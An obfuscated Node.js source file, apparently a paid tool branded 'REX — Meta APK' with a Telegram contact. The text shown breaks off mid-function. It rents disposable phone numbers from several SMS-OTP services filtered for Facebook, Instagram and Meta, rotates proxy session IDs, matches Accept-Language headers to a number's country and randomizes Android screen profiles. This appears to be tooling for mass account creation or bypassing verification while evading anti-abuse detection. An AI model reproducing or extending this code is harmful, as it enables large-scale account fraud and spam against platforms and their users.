const fs = require('fs'),
  path = require("path"),
  {
    execSync
  } = require("child_process"),
  {
    isMainThread
  } = require("worker_threads");
if (isMainThread) {
  const requiredModules = ["https-proxy-agent", "socks-proxy-agent", "chalk"];
  let missingModules = false;
  for (const mod of requiredModules) {
    try {
      require.resolve(mod);
    } catch (v88) {
      missingModules = true;
      break;
    }
  }
  if (missingModules) {
    console.log("\n[SETUP] Installing dependencies...");
    try {
      const npmCmd = path.join(path.dirname(process.execPath), process.platform === "win32" ? "npm.cmd" : "npm"),
        v89 = {};
      v89.stdio = "inherit", v89.shell = true, execSync('\x22' + npmCmd + "\" install https-proxy-agent socks-proxy-agent chalk@4", v89);
    } catch (v90) {
      console.error("[ERROR] Failed to install dependencies."), process.exit(1);
    }
  }
}
const http = require("http"),
  https = require("https"),
  zlib = require("zlib"),
  crypto = require("crypto"),
  chalk = require("chalk"),
  readline = require("readline"),
  {
    HttpsProxyAgent
  } = require("https-proxy-agent"),
  {
    SocksProxyAgent
  } = require("socks-proxy-agent"),
  delay = (v91, v92) => new Promise(v93 => setTimeout(v93, v92 !== undefined ? v91 + Math.random() * (v92 - v91) : v91));
class NexaRateLimiter {
  constructor(v94) {
    this.delayMs = v94;
    this.queue = [], this.processing = false;
  }
  ["enqueue"](v95) {
    return new Promise((v96, v97) => {
      this.queue.push(async () => {
        try {
          v96(await v95());
        } catch (v98) {
          v97(v98);
        }
      });
      if (!this.processing) this._process();
    });
  }
  async ["_process"]() {
    this.processing = true;
    while (this.queue.length > 0) {
      const v99 = this.queue.shift();
      await v99(), await new Promise(v100 => setTimeout(v100, this.delayMs));
    }
    this.processing = false;
  }
}
const nexaLimiter = new NexaRateLimiter(500),
  twoOoLimiter = new NexaRateLimiter(500),
  VOLTX_KEY_FILE = path.join(__dirname, "voltx_key.txt"),
  STEX_KEY_FILE = path.join(__dirname, "stex_key.txt"),
  TWOOO_HOST = "api.2oo9.cloud",
  TWOOO_VOLTX_GET = "/MXS47FLFX0U/tnevs/@public/api/getnum",
  TWOOO_VOLTX_CONSOLE = "/MXS47FLFX0U/tnevs/@public/api/console",
  TWOOO_STEX_GET = "/MXS47FLFX0U/tness/@public/api/getnum",
  TWOOO_STEX_CONSOLE = "/MXS47FLFX0U/tness/@public/api/console";
function stripRid(v101) {
  return v101.replace(/X+$/i, '').trim();
}
function twoOoFetchNumber(v102, v103, v104) {
  return new Promise((v105, v106) => {
    {
      const v107 = stripRid(v103),
        v108 = {};
      v108.rid = v107;
      const v109 = JSON.stringify(v108),
        v110 = {
          'hostname': TWOOO_HOST,
          'port': 0x1bb,
          'path': v104,
          'method': "POST",
          'headers': {
            'mauthapi': v102,
            'Content-Type': "application/json",
            'Content-Length': Buffer.byteLength(v109)
          }
        },
        v111 = https.request(v110, v112 => {
          {
            let v113 = '';
            v112.on("data", v114 => v113 += v114), v112.on("end", () => {
              try {
                const v115 = JSON.parse(v113);
                if (v115?.["meta"]?.["code"] === 200 && v115?.["data"]?.["no_plus_number"]) v105(v115.data.no_plus_number);else v106(new Error(v115?.["message"] || v115?.["meta"]?.["status"] || "2oo9: No number"));
              } catch (v116) {
                v106(new Error("2oo9: Invalid JSON"));
              }
            });
          }
        });
      v111.on("error", v117 => v106(new Error("2oo9 network: " + v117.message))), v111.setTimeout(10000, () => {
        v111.destroy();
        v106(new Error("2oo9: Timeout"));
      }), v111.write(v109), v111.end();
    }
  });
}
function twoOoFetchConsole(v118, v119) {
  return new Promise((v120, v121) => {
    const v122 = {};
    v122.mauthapi = v118;
    const v123 = {};
    v123.hostname = TWOOO_HOST, v123.port = 0x1bb, v123.path = v119, v123.method = "GET", v123.headers = v122;
    const v124 = v123,
      v125 = https.request(v124, v126 => {
        {
          let v127 = '';
          v126.on("data", v128 => v127 += v128), v126.on("end", () => {
            try {
              {
                const v129 = JSON.parse(v127);
                if (v129?.["meta"]?.["code"] === 200 && Array.isArray(v129?.["data"]?.["hits"])) v120(v129.data.hits);else v121(new Error(v129?.["message"] || "Console fetch failed"));
              }
            } catch (v130) {
              v121(new Error("Console: Invalid JSON"));
            }
          });
        }
      });
    v125.on("error", v131 => v121(new Error("Console network: " + v131.message))), v125.setTimeout(10000, () => {
      v125.destroy(), v121(new Error("Console timeout"));
    });
    v125.end();
  });
}
function parseTwoOoRangeSelection(v132, v133) {
  const v134 = new Set();
  const v135 = v132.split(/[\s,]+/).filter(v136 => v136);
  for (const v137 of v135) {
    const v138 = v137.match(/^(\d+)-(\d+)$/);
    if (v138) for (let v139 = +v138[1]; v139 <= +v138[2]; v139++) {
      {
        if (v139 >= 1 && v139 <= v133) v134.add(v139 - 1);
      }
    } else {
      const v140 = parseInt(v137);
      if (!isNaN(v140) && v140 >= 1 && v140 <= v133) v134.add(v140 - 1);
    }
  }
  return [...v134].sort((v141, v142) => v141 - v142);
}
async function autoRangeFinderFor2Oo(v143, v144, v145, v146) {
  const v147 = {};
  v147.facebook = ["facebook", 'fb'], v147.instagram = ["instagram", 'ig'], v147.meta = ["meta"], v147.all = ["facebook", 'fb', "instagram", 'ig', "meta"];
  const v148 = v147,
    v149 = {};
  v149.facebook = "📘 Facebook", v149.instagram = "📸 Instagram", v149.meta = "🌐 Meta", v149.all = "📦 All (FB+IG+Meta)";
  const v150 = v149;
  console.log(chalk.gray("\n  [Range Finder] Fetching live console feed..."));
  let v151 = [];
  try {
    v151 = await twoOoFetchConsole(v143, v144);
  } catch (v160) {
    return console.log(chalk.red("\n  ✗ Console fetch failed: " + v160.message + '\x0a')), null;
  }
  const v152 = v151.slice(0, 100);
  if (v152.length === 0) {
    return console.log(chalk.red("\n  ✗ No hits in console feed.\n")), null;
  }
  const v153 = await v145("Filter by app:", [{
      'name': "📘 Facebook",
      'value': "facebook"
    }, {
      'name': "📸 Instagram",
      'value': "instagram"
    }, {
      'name': "🌐 Meta",
      'value': "meta"
    }, {
      'name': "📦 All (FB+IG+Meta)",
      'value': "all"
    }]),
    v154 = v148[v153],
    v155 = v152.filter(v161 => {
      {
        const v162 = (v161.sid || '').toLowerCase(),
          v163 = (v161.message || '').toLowerCase();
        return v154.some(v164 => v162.includes(v164) || v163.includes(v164));
      }
    });
  if (v155.length === 0) return console.log(chalk.red("\n  ✗ No hits for selected app.\n")), null;
  const v156 = {},
    v157 = {};
  for (const v165 of v155) {
    const v166 = v165.range || '';
    if (!v166) continue;
    v156[v166] = (v156[v166] || 0) + 1;
    const v167 = {};
    v167.facebook = 0x0, v167.instagram = 0x0, v167.meta = 0x0, v157[v166] = v157[v166] || v167;
    if (v148.facebook.some(v168 => (v165.sid || '').toLowerCase().includes(v168) || (v165.message || '').toLowerCase().includes(v168))) v157[v166].facebook++;
    if (v148.instagram.some(v169 => (v165.sid || '').toLowerCase().includes(v169) || (v165.message || '').toLowerCase().includes(v169))) v157[v166].instagram++;
    if (v148.meta.some(v170 => (v165.sid || '').toLowerCase().includes(v170) || (v165.message || '').toLowerCase().includes(v170))) v157[v166].meta++;
  }
  const v158 = Object.entries(v156).sort((v171, v172) => v172[1] - v171[1]).slice(0, 5);
  if (v158.length === 0) return console.log(chalk.red("\n  ✗ No valid ranges.\n")), null;
  const v159 = await v145("Range Finder mode:", [{
    'name': "⚡ Auto detect & send (#1 range)",
    'value': "auto"
  }, {
    'name': "📊 Show top 5 & select",
    'value': "select"
  }]);
  if (v159 === "auto") {
    const [v173, v174] = v158[0],
      v175 = v157[v173] || {},
      v176 = [];
    if (v175.facebook) v176.push("📘FB(" + v175.facebook + ')');
    if (v175.instagram) v176.push("📸IG(" + v175.instagram + ')');
    if (v175.meta) v176.push("🌐Meta(" + v175.meta + ')');
    return console.log(chalk.green("\n  ✓ Auto Range: " + v173 + "  (" + v174 + " hits)  " + v176.join('\x20') + '\x0a')), [v173];
  } else {
    {
      console.log(chalk.cyan("\n  App: " + v150[v153] + "  |  Scanned: " + v155.length + " hits\n")), console.log(chalk.yellow("  #   Range              Hits  Apps")), console.log(chalk.gray("  ─".repeat(22))), v158.forEach(([v180, v181], v182) => {
        {
          const v183 = v157[v180] || {},
            v184 = [];
          if (v183.facebook) v184.push("📘FB(" + v183.facebook + ')');
          if (v183.instagram) v184.push("📸IG(" + v183.instagram + ')');
          if (v183.meta) v184.push("🌐Meta(" + v183.meta + ')');
          console.log(chalk.cyan('\x20\x20' + String(v182 + 1).padEnd(3) + '\x20') + chalk.green(v180.padEnd(16)) + chalk.yellow(String(v181).padEnd(5)) + chalk.gray('█'.repeat(Math.min(v181, 12)) + '\x20\x20') + (v184.join('\x20') || chalk.gray('?')));
        }
      }), console.log(chalk.gray("\n  Enter selection (e.g. 1,3 | 1 2 5 | 1-3)\n"));
      const v177 = await v146("Select ranges:", ''),
        v178 = parseTwoOoRangeSelection(v177, v158.length);
      if (v178.length === 0) {
        return console.log(chalk.red("\n  ✗ No valid selection.\n")), null;
      }
      const v179 = v178.map(v185 => v158[v185][0]);
      return console.log(chalk.green("\n  ✓ Selected: " + v179.join(',\x20') + '\x0a')), v179;
    }
  }
}
const SMSBOWER_HOST = "smsbower.page",
  SMSBOWER_KEY_FILE = path.join(__dirname, "smsbower_key.txt");
function smsBowerRequest(v186) {
  return new Promise((v187, v188) => {
    {
      const v189 = {};
      v189.hostname = SMSBOWER_HOST, v189.port = 0x1bb, v189.path = "/stubs/handler_api.php?" + v186, v189.method = "GET", v189.headers = {}, v189.headers.Accept = "text/plain", v189.headers.Connection = "close";
      const v190 = v189,
        v191 = https.request(v190, v192 => {
          {
            let v193 = '';
            v192.on("data", v194 => v193 += v194), v192.on("end", () => v187(v193.trim()));
          }
        });
      v191.on("error", v195 => v188(new Error("SmsBower net: " + v195.message))), v191.setTimeout(15000, () => {
        v191.destroy();
        v188(new Error("SmsBower timeout"));
      }), v191.end();
    }
  });
}
function smsBowerFetchNumber(v196, v197, v198, v199) {
  let v200 = "api_key=" + encodeURIComponent(v196) + "&action=getNumber&service=" + encodeURIComponent(v197 || 'fb');
  if (v198 && String(v198).trim() !== '0' && String(v198).trim() !== '') {
    v200 += "&country=" + encodeURIComponent(v198);
  }
  v199 && parseFloat(v199) > 0 && (v200 += "&maxPrice=" + encodeURIComponent(v199));
  return smsBowerRequest(v200).then(v201 => {
    {
      if (v201.startsWith("ACCESS_NUMBER:")) {
        const v202 = v201.split(':');
        return {
          'activationId': v202[1],
          'phoneNumber': v202[2].replace(/[^0-9]/g, '')
        };
      }
      throw new Error("SmsBower: " + v201);
    }
  });
}
const ZENEX_HOST = "api.zenexnetwork.com",
  ZENEX_KEY_FILE = path.join(__dirname, "zenex_key.txt");
function zenexFetchNumber(v203, v204) {
  return new Promise((v205, v206) => {
    {
      const v207 = {};
      v207.range = v204, v207.is_national = false, v207.remove_plus = false;
      const v208 = JSON.stringify(v207),
        v209 = {
          'hostname': ZENEX_HOST,
          'port': 0x1bb,
          'path': "/v1/getnum",
          'method': "POST",
          'headers': {
            'mapikey': v203,
            'Content-Type': "application/json",
            'Content-Length': Buffer.byteLength(v208)
          }
        },
        v210 = https.request(v209, v211 => {
          let v212 = '';
          v211.on("data", v213 => v212 += v213), v211.on("end", () => {
            try {
              const v214 = JSON.parse(v212);
              if (v214?.["meta"]?.["code"] === 200 && v214?.["data"]?.["full_number"]) v205(v214.data.full_number.replace(/[^0-9]/g, ''));else v206(new Error(v214?.["message"] || "Zenex: no number"));
            } catch (v215) {
              v206(new Error("Zenex: invalid JSON"));
            }
          });
        });
      v210.on("error", v216 => v206(new Error("Zenex net: " + v216.message))), v210.setTimeout(15000, () => {
        v210.destroy();
        v206(new Error("Zenex timeout"));
      }), v210.write(v208), v210.end();
    }
  });
}
function nexaFetchNumber(v217, v218, v219) {
  return new Promise((v220, v221) => {
    {
      const v222 = {};
      v222.range = v218, v222.format = "normal";
      const v223 = JSON.stringify(v222),
        v224 = {
          'hostname': "nexaotpservice.com",
          'port': 0x50,
          'path': v219 || "/api/v1/numbers/get",
          'method': "POST",
          'headers': {
            'X-API-Key': v217,
            'Content-Type': "application/json",
            'Content-Length': Buffer.byteLength(v223)
          }
        },
        v225 = http.request(v224, v226 => {
          let v227 = '';
          v226.on("data", v228 => v227 += v228);
          v226.on("end", () => {
            try {
              {
                const v229 = JSON.parse(v227);
                if (v229.success && v229.number) v220(v229.number.replace(/[^0-9]/g, ''));else {
                  v221(new Error(v229.error || "NexaOTP: No number returned"));
                }
              }
            } catch (v230) {
              v221(new Error("NexaOTP: Invalid response"));
            }
          });
        });
      v225.on("error", v231 => v221(new Error("NexaOTP network: " + v231.message))), v225.setTimeout(10000, () => {
        v225.destroy();
        v221(new Error("NexaOTP: Timeout"));
      }), v225.write(v223), v225.end();
    }
  });
}
function debugLog(v232, v233, v234, v235 = null) {}
const B = chalk.hex("#00FF88"),
  C = chalk.hex("#1877F2"),
  Y = chalk.hex("#FFD700"),
  W = chalk.white,
  G = chalk.gray,
  R = chalk.hex("#FF6B6B"),
  M = chalk.hex("#9370DB");
function printHeader() {
  {
    process.stdout.write("[2J[3J[H");
    console.log(C("   ____                                      _  ___              "));
    console.log(C("  / ___|  ___ _ __ __ _ _ __   ___ _ __     | |/ (_)_ __   __ _  "));
    console.log(C("  \\___ \\ / __| '__/ _` | '_ \\ / _ \\ '__|    | ' <| | '_ \\ / _` | "));
    console.log(C("   ___) | (__| | | (_| | |_) |  __/ |       | . \\| | | | | (_| | "));
    console.log(C("  |____/ \\___|_|  \\__,_| .__/ \\___|_|       |_|\\_\\_|_| |_|\\__, | "));
    console.log(C("                       |_|                                |___/  \n"));
    console.log(W("┌──────────────────────────────────────────────┐"));
    console.log(W("│ [•] Tool      : ") + C("REX — Meta APK (Stella)      ") + W('│'));
    console.log(W("│ [•] Telegram  : ") + C("t.me/Rex_OTP_Tool            ") + W('│'));
    console.log(W("│ [•] Status    : ") + G("Premium License              ") + W('│'));
    console.log(W("│ [•] Version   : ") + Y("V6.0.0 (APK Flow)            ") + W('│'));
    console.log(W("└──────────────────────────────────────────────┘\n"));
  }
}
let _displayNames;
try {
  const v236 = {};
  v236.type = "region", _displayNames = new Intl.DisplayNames(['en'], v236);
} catch (v237) {
  const v238 = {};
  v238.of = v239 => v239, _displayNames = v238;
}
function rotateSessionId(v240) {
  if (!v240 || !v240.user) return v240;
  const v241 = {
      ...v240
    },
    v242 = v241;
  const v243 = [/-ssid-[A-Za-z0-9_]+/, /-session-[A-Za-z0-9_]+/, /_session_[A-Za-z0-9_]+/, /-sess-[A-Za-z0-9_]+/];
  for (const v244 of v243) {
    if (v242.user && v244.test(v242.user)) {
      {
        const v245 = crypto.randomBytes(6).toString("base64").replace(/[+/=]/g, '').substring(0, 10);
        v242.user = v242.user.replace(v244, '' + v244.source.split('[')[0].replace(/\\/g, '') + v245);
        break;
      }
    }
    if (v242.pass && v244.test(v242.pass)) {
      {
        const v246 = crypto.randomBytes(6).toString("base64").replace(/[+/=]/g, '').substring(0, 10);
        v242.pass = v242.pass.replace(v244, '' + v244.source.split('[')[0].replace(/\\/g, '') + v246);
        break;
      }
    }
  }
  return v242;
}
function parseProxy(v247) {
  if (!v247) return null;
  if (typeof v247 === "object") return v247;
  v247 = v247.trim();
  if (!v247) return null;
  let v248, v249, v250, v251;
  if (v247.includes("://")) v247 = v247.split("://")[1];
  if (v247.includes('@')) {
    const v253 = v247.split('@'),
      v254 = v253[0].split(':'),
      v255 = v253[1].split(':');
    v250 = v254[0], v251 = v254[1], v248 = v255[0], v249 = parseInt(v255[1]);
  } else {
    {
      const v256 = v247.split(':');
      if (v256.length === 2) v248 = v256[0], v249 = parseInt(v256[1]);else {
        if (v256.length === 4) {
          if (!isNaN(parseInt(v256[3])) && isNaN(parseInt(v256[1]))) {
            v250 = v256[0], v251 = v256[1], v248 = v256[2], v249 = parseInt(v256[3]);
          } else v248 = v256[0], v249 = parseInt(v256[1]), v250 = v256[2], v251 = v256[3];
        } else {
          if (v256.length === 3) {
            v248 = v256[0], v249 = parseInt(v256[1]), v250 = v256[2];
          }
        }
      }
    }
  }
  if (!v248 || !v249) return null;
  const v252 = {};
  return v252.type = "http", v252.host = v248, v252.port = v249, v252.user = v250, v252.pass = v251, v252.original = v247, v252;
}
function createProxyAgent(v257) {
  if (!v257) return null;
  let v258 = '';
  return v257.type === "socks5" || v257.type === "socks4" ? (v258 = "socks5://" + (v257.user ? v257.user + ':' + v257.pass + '@' : '') + v257.host + ':' + v257.port, new SocksProxyAgent(v258)) : (v258 = "http://" + (v257.user ? v257.user + ':' + v257.pass + '@' : '') + v257.host + ':' + v257.port, new HttpsProxyAgent(v258));
}
function getProxyCountry(v259) {
  if (!v259) return "Proxy";
  const v260 = (v259.user || '').toLowerCase();
  let v261 = null;
  const v262 = v260.match(/_cr\.([a-z]{2})\b/);
  if (v262) v261 = v262[1].toUpperCase();
  if (!v261) {
    {
      const v263 = v260.match(/_zone_([a-z]{2})(?:_|$)/);
      if (v263) v261 = v263[1].toUpperCase();
    }
  }
  if (!v261) {
    {
      const v264 = v260.match(/[_\-]country[_\-]([a-z]{2})/i) || v260.match(/[_\-]cc[_\-]([a-z]{2})/i) || v260.match(/customer[_\-]([a-z]{2})\b/i);
      if (v264) v261 = v264[1].toUpperCase();
    }
  }
  if (!v261) return "Proxy";
  try {
    return _displayNames.of(v261) || v261;
  } catch (v265) {
    return v261;
  }
}
const DIAL_MAP = [["1868", 'TT', "en-TT,en;q=0.9"], ["1876", 'JM', "en-JM,en;q=0.9"], ["1809", 'DO', "es-DO,es;q=0.9,en;q=0.8"], ["1829", 'DO', "es-DO,es;q=0.9,en;q=0.8"], ["1849", 'DO', "es-DO,es;q=0.9,en;q=0.8"], ["880", 'BD', "bn-BD,bn;q=0.9,en;q=0.8"], ["855", 'KH', "km-KH,km;q=0.9,en;q=0.8"], ["856", 'LA', "lo-LA,lo;q=0.9,en;q=0.8"], ["228", 'TG', "fr-TG,fr;q=0.9,en;q=0.8"], ["229", 'BJ', "fr-BJ,fr;q=0.9,en;q=0.8"], ["233", 'GH', "en-GH,en;q=0.9"], ["234", 'NG', "en-NG,en;q=0.9"], ["237", 'CM', "fr-CM,fr;q=0.9,en;q=0.8"], ["243", 'CD', "fr-CD,fr;q=0.9"], ["254", 'KE', "sw-KE,sw;q=0.9,en;q=0.8"], ["255", 'TZ', "sw-TZ,sw;q=0.9,en;q=0.8"], ["256", 'UG', "en-UG,en;q=0.9"], ["260", 'ZM', "en-ZM,en;q=0.9"], ["263", 'ZW', "en-ZW,en;q=0.9"], ["212", 'MA', "ar-MA,ar;q=0.9,fr;q=0.8"], ["213", 'DZ', "ar-DZ,ar;q=0.9,fr;q=0.8"], ["216", 'TN', "ar-TN,ar;q=0.9,fr;q=0.8"], ["218", 'LY', "ar-LY,ar;q=0.9,en;q=0.8"], ["220", 'GM', "en-GM,en;q=0.9"], ["221", 'SN', "fr-SN,fr;q=0.9"], ["222", 'MR', "ar-MR,ar;q=0.9,fr;q=0.8"], ["223", 'ML', "fr-ML,fr;q=0.9"], ["224", 'GN', "fr-GN,fr;q=0.9"], ["225", 'CI', "fr-CI,fr;q=0.9"], ["226", 'BF', "fr-BF,fr;q=0.9"], ["227", 'NE', "fr-NE,fr;q=0.9"], ["230", 'MU', "en-MU,en;q=0.9,fr;q=0.8"], ["231", 'LR', "en-LR,en;q=0.9"], ["232", 'SL', "en-SL,en;q=0.9"], ["235", 'TD', "fr-TD,fr;q=0.9,ar;q=0.8"], ["236", 'CF', "fr-CF,fr;q=0.9"], ["238", 'CV', "pt-CV,pt;q=0.9"], ["239", 'ST', "pt-ST,pt;q=0.9"], ["240", 'GQ', "es-GQ,es;q=0.9"], ["241", 'GA', "fr-GA,fr;q=0.9"], ["242", 'CG', "fr-CG,fr;q=0.9"], ["244", 'AO', "pt-AO,pt;q=0.9"], ["245", 'GW', "pt-GW,pt;q=0.9"], ["246", 'IO', "en-IO,en;q=0.9"], ["247", 'AC', "en-AC,en;q=0.9"], ["248", 'SC', "en-SC,en;q=0.9,fr;q=0.8"], ["249", 'SD', "ar-SD,ar;q=0.9,en;q=0.8"], ["250", 'RW', "rw-RW,rw;q=0.9,en;q=0.8,fr;q=0.7"], ["251", 'ET', "am-ET,am;q=0.9,en;q=0.8"], ["252", 'SO', "so-SO,so;q=0.9,ar;q=0.8,en;q=0.7"], ["253", 'DJ', "fr-DJ,fr;q=0.9,ar;q=0.8"], ["257", 'BI', "fr-BI,fr;q=0.9,rn;q=0.8"], ["258", 'MZ', "pt-MZ,pt;q=0.9"], ["261", 'MG', "mg-MG,mg;q=0.9,fr;q=0.8"], ["262", 'RE', "fr-RE,fr;q=0.9"], ["264", 'NA', "en-NA,en;q=0.9"], ["265", 'MW', "en-MW,en;q=0.9"], ["266", 'LS', "en-LS,en;q=0.9"], ["267", 'BW', "en-BW,en;q=0.9"], ["268", 'SZ', "en-SZ,en;q=0.9"], ["269", 'KM', "fr-KM,fr;q=0.9,ar;q=0.8"], ["966", 'SA', "ar-SA,ar;q=0.9,en;q=0.8"], ["971", 'AE', "ar-AE,ar;q=0.9,en;q=0.8"], ["973", 'BH', "ar-BH,ar;q=0.9,en;q=0.8"], ["974", 'QA', "ar-QA,ar;q=0.9,en;q=0.8"], ["968", 'OM', "ar-OM,ar;q=0.9,en;q=0.8"], ["965", 'KW', "ar-KW,ar;q=0.9,en;q=0.8"], ["964", 'IQ', "ar-IQ,ar;q=0.9,en;q=0.8"], ["963", 'SY', "ar-SY,ar;q=0.9,en;q=0.8"], ["962", 'JO', "ar-JO,ar;q=0.9,en;q=0.8"], ["961", 'LB', "ar-LB,ar;q=0.9,en;q=0.8,fr;q=0.7"], ["967", 'YE', "ar-YE,ar;q=0.9,en;q=0.8"], ["970", 'PS', "ar-PS,ar;q=0.9,en;q=0.8"], ["972", 'IL', "he-IL,he;q=0.9,en;q=0.8"], ["992", 'TJ', "tg-TJ,tg;q=0.9,ru;q=0.8"], ["993", 'TM', "tk-TM,tk;q=0.9,ru;q=0.8"], ["994", 'AZ', "az-AZ,az;q=0.9,ru;q=0.8"], ["995", 'GE', "ka-GE,ka;q=0.9,en;q=0.8"], ["996", 'KG', "ky-KG,ky;q=0.9,ru;q=0.8"], ["998", 'UZ', "uz-UZ,uz;q=0.9,ru;q=0.8"], ["977", 'NP', "ne-NP,ne;q=0.9,en;q=0.8"], ["975", 'BT', "dz-BT,dz;q=0.9,en;q=0.8"], ["959", 'MM', "my-MM,my;q=0.9,en;q=0.8"], ["670", 'TL', "pt-TL,pt;q=0.9,en;q=0.8"], ["673", 'BN', "ms-BN,ms;q=0.9,en;q=0.8"], ["676", 'TO', "en-TO,en;q=0.9"], ["677", 'SB', "en-SB,en;q=0.9"], ["678", 'VU', "en-VU,en;q=0.9,fr;q=0.8"], ["679", 'FJ', "en-FJ,en;q=0.9"], ["680", 'PW', "en-PW,en;q=0.9"], ["591", 'BO', "es-BO,es;q=0.9,en;q=0.8"], ["592", 'GY', "en-GY,en;q=0.9"], ["593", 'EC', "es-EC,es;q=0.9,en;q=0.8"], ["594", 'GF', "fr-GF,fr;q=0.9"], ["595", 'PY', "es-PY,es;q=0.9,en;q=0.8"], ["596", 'MQ', "fr-MQ,fr;q=0.9"], ["597", 'SR', "nl-SR,nl;q=0.9,en;q=0.8"], ["598", 'UY', "es-UY,es;q=0.9,en;q=0.8"], ["387", 'BA', "bs-BA,bs;q=0.9,hr;q=0.8,en;q=0.7"], ["385", 'HR', "hr-HR,hr;q=0.9,en;q=0.8"], ["386", 'SI', "sl-SI,sl;q=0.9,en;q=0.8"], ["389", 'MK', "mk-MK,mk;q=0.9,en;q=0.8"], ["381", 'RS', "sr-RS,sr;q=0.9,en;q=0.8"], ["382", 'ME', "sr-ME,sr;q=0.9,en;q=0.8"], ["383", 'XK', "sq-XK,sq;q=0.9,sr;q=0.8,en;q=0.7"], ["355", 'AL', "sq-AL,sq;q=0.9,en;q=0.8"], ["356", 'MT', "mt-MT,mt;q=0.9,en;q=0.8"], ["357", 'CY', "el-CY,el;q=0.9,en;q=0.8"], ["358", 'FI', "fi-FI,fi;q=0.9,sv;q=0.8,en;q=0.7"], ["359", 'BG', "bg-BG,bg;q=0.9,en;q=0.8"], ["370", 'LT', "lt-LT,lt;q=0.9,en;q=0.8"], ["371", 'LV', "lv-LV,lv;q=0.9,en;q=0.8"], ["372", 'EE', "et-EE,et;q=0.9,en;q=0.8"], ["373", 'MD', "ro-MD,ro;q=0.9,ru;q=0.8,en;q=0.7"], ["374", 'AM', "hy-AM,hy;q=0.9,en;q=0.8"], ["375", 'BY', "be-BY,be;q=0.9,ru;q=0.8,en;q=0.7"], ["376", 'AD', "ca-AD,ca;q=0.9,es;q=0.8,en;q=0.7"], ["377", 'MC', "fr-MC,fr;q=0.9,en;q=0.8"], ["378", 'SM', "it-SM,it;q=0.9,en;q=0.8"], ["380", 'UA', "uk-UA,uk;q=0.9,ru;q=0.8,en;q=0.7"], ["420", 'CZ', "cs-CZ,cs;q=0.9,en;q=0.8"], ["421", 'SK', "sk-SK,sk;q=0.9,en;q=0.8"], ["423", 'LI', "de-LI,de;q=0.9,en;q=0.8"], ['20', 'EG', "ar-EG,ar;q=0.9,en;q=0.8"], ['27', 'ZA', "en-ZA,en;q=0.9"], ['30', 'GR', "el-GR,el;q=0.9,en;q=0.8"], ['31', 'NL', "nl-NL,nl;q=0.9,en;q=0.8"], ['32', 'BE', "nl-BE,nl;q=0.9,fr;q=0.8,en;q=0.7"], ['33', 'FR', "fr-FR,fr;q=0.9,en;q=0.8"], ['34', 'ES', "es-ES,es;q=0.9,en;q=0.8"], ['36', 'HU', "hu-HU,hu;q=0.9,en;q=0.8"], ['39', 'IT', "it-IT,it;q=0.9,en;q=0.8"], ['40', 'RO', "ro-RO,ro;q=0.9,en;q=0.8"], ['41', 'CH', "de-CH,de;q=0.9,fr;q=0.8,en;q=0.7"], ['43', 'AT', "de-AT,de;q=0.9,en;q=0.8"], ['44', 'GB', "en-GB,en;q=0.9"], ['45', 'DK', "da-DK,da;q=0.9,en;q=0.8"], ['46', 'SE', "sv-SE,sv;q=0.9,en;q=0.8"], ['47', 'NO', "nb-NO,nb;q=0.9,en;q=0.8"], ['48', 'PL', "pl-PL,pl;q=0.9,en;q=0.8"], ['49', 'DE', "de-DE,de;q=0.9,en;q=0.8"], ['51', 'PE', "es-PE,es;q=0.9,en;q=0.8"], ['52', 'MX', "es-MX,es;q=0.9,en;q=0.8"], ['53', 'CU', "es-CU,es;q=0.9"], ['54', 'AR', "es-AR,es;q=0.9,en;q=0.8"], ['55', 'BR', "pt-BR,pt;q=0.9,en;q=0.8"], ['56', 'CL', "es-CL,es;q=0.9,en;q=0.8"], ['57', 'CO', "es-CO,es;q=0.9,en;q=0.8"], ['58', 'VE', "es-VE,es;q=0.9,en;q=0.8"], ['60', 'MY', "ms-MY,ms;q=0.9,en;q=0.8"], ['61', 'AU', "en-AU,en;q=0.9"], ['62', 'ID', "id-ID,id;q=0.9,en;q=0.8"], ['63', 'PH', "en-PH,en;q=0.9,fil;q=0.8"], ['64', 'NZ', "en-NZ,en;q=0.9"], ['65', 'SG', "en-SG,en;q=0.9,zh;q=0.8"], ['66', 'TH', "th-TH,th;q=0.9,en;q=0.8"], ['81', 'JP', "ja-JP,ja;q=0.9,en;q=0.8"], ['82', 'KR', "ko-KR,ko;q=0.9,en;q=0.8"], ['84', 'VN', "vi-VN,vi;q=0.9,en;q=0.8"], ['86', 'CN', "zh-CN,zh;q=0.9,en;q=0.8"], ['90', 'TR', "tr-TR,tr;q=0.9,en;q=0.8"], ['91', 'IN', "hi-IN,hi;q=0.9,en;q=0.8"], ['92', 'PK', "ur-PK,ur;q=0.9,en;q=0.8"], ['93', 'AF', "ps-AF,ps;q=0.9,en;q=0.8"], ['94', 'LK', "si-LK,si;q=0.9,en;q=0.8"], ['95', 'MM', "my-MM,my;q=0.9,en;q=0.8"], ['98', 'IR', "fa-IR,fa;q=0.9,en;q=0.8"], ['1', 'US', "en-US,en;q=0.9"], ['7', 'RU', "ru-RU,ru;q=0.9,en;q=0.8"]];
function getCountryFromPhone(v266) {
  for (const [v268, v269, v270] of DIAL_MAP) {
    const v271 = {};
    v271.iso = v269, v271.lang = v270;
    if (v266.startsWith(v268)) return v271;
  }
  const v267 = {};
  v267.iso = 'US';
  return v267.lang = "en-US,en;q=0.9", v267;
}
function getRandomScreenDensity() {
  const v272 = {};
  v272.density = "2.0", v272.width = 0x438, v272.height = 0x780, v272.dpi = 0x140;
  const v273 = {};
  v273.density = "2.625", v273.width = 0x438, v273.height = 0x6ed, v273.dpi = 0x1a4;
  const v274 = {};
  v274.density = "2.625", v274.width = 0x438, v274.height = 0x924, v274.dpi = 0x1a4;
  const v275 = {};
  v275.density = "2.625", v275.width = 0x438, v275.height = 0x960, v275.dpi = 0x1a4;
  const v276 = {};
  v276.density = "2.75", v276.width = 0x438;
  v276.height = 0x960, v276.dpi = 0x1b8;
  const v277 = {};
  v277.density = "3.0", v277.width = 0x438, v277.height = 0x924, v277.dpi = 0x1e0;
  const v278 = {};
  v278.density = "3.0", v278.width = 0x438, v278.height = 0x960, v278.dpi = 0x1e0;
  const v279 = {};
  v279.density = "3.5", v279.width = 0x5a0, v279.height = 0xc30, v279.dpi = 0x230;
  const v280 = {};
  v280.density = "3.75", v280.width = 0x5a0, v280.height = 0xc10;
  v280.dpi = 0x258;
  const v281 = {};
  v281.density = "4.0", v281.width = 0x5a0, v281.height = 0xc80, v281.dpi = 0x280;
  const v282 = {};
  v282.density = "1.5", v282.width = 0x2d0, v282.height = 0x500, v282.dpi = 0xf0;
  const v283 = {};
  v283.density = "1.75", v283.width = 0x2d0, v283.height = 0x640;
  v283.dpi = 0x118;
  const v284 = [v272, v273, v274, v275, v276, v277, v278, v279, v280, v281, v282, v283];
